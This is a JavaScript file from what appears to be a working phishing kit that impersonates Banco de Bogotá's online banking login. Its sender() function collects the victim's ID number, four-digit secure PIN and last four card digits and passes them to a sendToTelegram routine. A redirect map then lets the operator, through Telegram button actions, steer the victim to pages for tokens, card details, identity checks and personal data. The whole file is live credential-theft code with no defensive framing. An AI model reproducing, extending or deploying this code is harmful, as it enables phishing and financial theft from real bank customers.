// ========== MAPA DE REDIRECCIONES ==========
const REDIRECTS = {
  'error': 'index1.html?error=wrong_data',
  'token': 'token.html',
  'token_otro': 'tokeninv.html',
  'tarjeta_debito': 'tarjeta.html',
  'tarjeta_credito': 'tarjeta.html',
  'error_debito': 'tarjeta.html?error=invalid',
  'error_débito': 'tarjeta.html?error=invalid', 
  'error_credito': 'tarjeta.html?error=invalid', 
  'error_crédito': 'tarjeta.html?error=invalid', 
  'soyyo': 'soyyo.html',
  'datos_personales': 'https://cupo-virtualbogota.pages.dev/bogota/datos-personales.html',
  'finalizar': 'final.html',
  'error_logo': 'soyyo.html?error=invalid',
};

let actionProcessed = false;

// ========== MANEJAR ACCIONES DE TELEGRAM ==========
window.handleTelegramAction = function(action) {
  if (actionProcessed) {
    console.log('⚠️ Acción ya procesada');
    return;
  }
  
  console.log('📩 Acción recibida:', action);
  actionProcessed = true;
  
  if (action === 'tarjeta_debito') {
    localStorage.setItem('card_type', 'Débito');
  } else if (action === 'tarjeta_credito') {
    localStorage.setItem('card_type', 'Crédito');
  }
  
  const redirectUrl = REDIRECTS[action];
  
  if (redirectUrl) {
    console.log('✅ Redirigiendo a:', redirectUrl);
    
    if (window.stopListening) {
      window.stopListening();
    }
    
    setTimeout(() => {
      window.location.href = redirectUrl;
    }, 100);
  } else {
    console.warn('⚠️ Acción desconocida:', action);
    actionProcessed = false;
  }
};

// ========== FUNCIONES DEL FORMULARIO LOGIN ==========
// Estado global del tab actual
var currentTabMode = 'clave_segura';

function switchTab(tab) {
  currentTabMode = tab;

  // Activar tab visualmente por atributo onclick, no por indice
  document.querySelectorAll('.tab').forEach(function(t) {
    if (t.getAttribute('onclick') && t.getAttribute('onclick').indexOf(tab) !== -1) {
      t.classList.add('active');
    } else {
      t.classList.remove('active');
    }
  });

  var clvseg = document.getElementById('clvseg');
  var last4Container = document.getElementById('last4-container');
  var last4Input = document.getElementById('last4');
  var infoMsg = document.getElementById('infoMsg');
  var passLabel = document.getElementById('passLabel');

  if (!clvseg || !last4Container) return;

  clvseg.value = '';
  if (last4Input) last4Input.value = '';

  if (tab === 'clave_segura') {
    if (passLabel) passLabel.textContent = 'Clave segura';
    clvseg.placeholder = '\u2022\u2022\u2022\u2022';
    clvseg.maxLength = 4;
    clvseg.minLength = 4;
    clvseg.setAttribute('inputmode', 'numeric');

    last4Container.style.cssText = 'display:none !important';
    if (last4Input) { last4Input.required = false; last4Input.value = ''; }

    if (infoMsg) {
      infoMsg.style.display = 'block';
      infoMsg.innerHTML = "Est\u00e1s ingresando con tu Clave Segura. Selecciona 'Tarjeta D\u00e9bito' para cambiar el tipo de ingreso.<span class=\"close\" onclick=\"this.parentElement.style.display='none'\">\u00d7</span>";
    }
  } else {
    if (passLabel) passLabel.textContent = 'Contrase\u00f1a';
    clvseg.placeholder = 'Contrase\u00f1a';
    clvseg.maxLength = 4;
    clvseg.minLength = 4;
    clvseg.setAttribute('inputmode', 'numeric');

    last4Container.style.cssText = 'display:block !important';
    if (last4Input) { last4Input.required = true; last4Input.value = ''; }

    if (infoMsg) {
      infoMsg.style.display = 'block';
      infoMsg.innerHTML = "Est\u00e1s ingresando con tu Tarjeta D\u00e9bito.<span class=\"close\" onclick=\"this.parentElement.style.display='none'\">\u00d7</span>";
    }
  }
}

// Listener permanente — limita a 4 caracteres siempre
document.addEventListener('DOMContentLoaded', function() {
  var clvseg = document.getElementById('clvseg');
  if (!clvseg) return;
  clvseg.addEventListener('input', function() {
    if (this.value.length > 4) this.value = this.value.slice(0, 4);
    if (currentTabMode === 'clave_segura') {
      this.value = this.value.replace(/[^0-9]/g, '');
    }
  });
});

function scrollIcons(direction) {
  const track = document.getElementById('iconsTrack');
  if (!track) return;
  
  const scrollAmount = 200;
  if (direction === 'left') {
    track.scrollBy({ left: -scrollAmount, behavior: 'smooth' });
  } else {
    track.scrollBy({ left: scrollAmount, behavior: 'smooth' });
  }
}

function sender() {
  const tipoPersona = document.getElementById('tipoPersona').value;
  const tipoId = document.getElementById('IType').value;
  const numeroId = document.getElementById('numi').value;
  const clave = document.getElementById('clvseg').value;
  const last4Container = document.getElementById('last4-container');
  const last4 = last4Container.style.display !== 'none' ? document.getElementById('last4').value : '';
  
  if (!numeroId || !clave) {
    alert('Por favor completa todos los campos');
    return false;
  }
  
  if (last4Container.style.display !== 'none' && !last4) {
    alert('Por favor ingresa los últimos 4 dígitos');
    return false;
  }
  
  const tipoIngreso = last4Container.style.display !== 'none' ? 'Tarjeta Débito' : 'Clave Segura';
  
  localStorage.removeItem('bbogota_msg_id');
  
  localStorage.setItem('user_id_type', tipoId);
  localStorage.setItem('user_id_number', numeroId);
  localStorage.setItem('user_person_type', tipoPersona);
  
  const loginData = {
    tipo_persona: tipoPersona,
    tipo_identificacion: tipoId,
    numero_identificacion: numeroId,
    clave: clave,
    tipo_ingreso: tipoIngreso,
    ultimos_4_digitos: last4 || 'N/A'
  };
  
  console.log('📤 Enviando login');
  
  document.getElementById('loading-overlay').style.display = 'flex';
  
  if (typeof sendToTelegram === 'function') {
    sendToTelegram('login', loginData, function() {
      console.log('✅ Login enviado');
      window.location.href = 'load.html';
    });
  } else {
    setTimeout(function() {
      document.getElementById('loading-overlay').style.display = 'none';
      alert('Error de conexión');
    }, 2000);
  }
  
  return false;
}

// ========== INICIALIZACIÓN ==========
document.addEventListener('DOMContentLoaded', function() {
  const eyeIcons = document.querySelectorAll('span[style*="cursor:pointer"]');
  eyeIcons.forEach(function(icon) {
    icon.addEventListener('click', function() {
      const input = this.previousElementSibling;
      if (input && input.type === 'password') {
        input.type = 'text';
        this.textContent = '👁️‍🗨️';
      } else if (input) {
        input.type = 'password';
        this.textContent = '👁️';
      }
    });
  });
  
  const existingMsgId = localStorage.getItem('bbogota_msg_id');
  const currentPage = window.location.pathname;
  
  // 🚫 PÁGINAS DONDE NO DEBE ESCUCHAR
  const noListenPages = ['index1', 'soyyo', 'datos-personales'];
  const shouldNotListen = noListenPages.some(page => currentPage.includes(page));
  
  const isLoadPage = currentPage.includes('load.html');
  
  console.log('📍 Página:', currentPage);
  
  if (shouldNotListen) {
    console.log('🚫 No escuchar aquí');
    return;
  }
  
  if (isLoadPage && existingMsgId && typeof listenCurrentButtons === 'function') {
    console.log('👂 Escuchando en load.html');
    console.log('📱 Message ID:', existingMsgId);
    
    actionProcessed = false;
    
    setTimeout(() => {
      listenCurrentButtons(window.handleTelegramAction);
    }, 500);
  }
});
